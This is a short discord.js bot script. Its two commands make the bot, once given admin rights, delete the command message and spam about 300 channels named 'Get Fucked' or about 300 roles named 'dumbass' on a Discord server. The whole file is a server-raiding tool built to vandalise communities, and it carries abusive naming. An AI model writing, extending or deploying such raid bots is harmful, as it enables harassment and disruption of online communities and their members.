const { Client } = require('discord.js');
const token = 'your_token_here';
const client = new Client();
const Prefix = '-'

//Bot needs admin to work


client.on('message', async msg => {
  if (msg.content === Prefix + 'channel')
  {
    msg.delete();
    var i;
    for ( i=0  ; i <= 300; i++) // makes 300 channels  named Get Fucked
    {
    var channel = await msg.guild.createChannel('Get Fucked');

    }

  }
  if (msg.content === Prefix + 'role')
  {
    msg.delete();

    for ( i=0  ; i <= 300; i++) // makes 300 roles named dumbass
    {

    await msg.guild.createRole({name:'dumbass'}) //spam make roles

  }
}

});
client.login(token).catch(console.error);
